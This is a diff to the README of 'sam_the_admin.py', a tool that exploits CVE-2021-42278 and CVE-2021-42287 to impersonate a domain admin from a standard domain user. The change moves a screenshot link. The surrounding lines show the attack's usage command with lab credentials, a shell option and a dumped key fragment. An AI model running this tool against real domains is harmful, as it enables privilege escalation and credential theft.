@@ -20,6 +20,8 @@ usage:
 
 `python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -shell`
 
+![image](https://user-images.githubusercontent.com/16593068/146140741-c00f1618-92c8-4d1f-be0c-781e4f660aed.png)
+
 ```bash
 $ python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -shell
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
@@ -160,7 +162,7 @@ SAMTHEADMIN-78$:des-cbc-md5:b6c8865764e65734
 [*] Cleaning up...
 ```
 
-![image](https://user-images.githubusercontent.com/16593068/146140741-c00f1618-92c8-4d1f-be0c-781e4f660aed.png)
+
 
 Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 
 
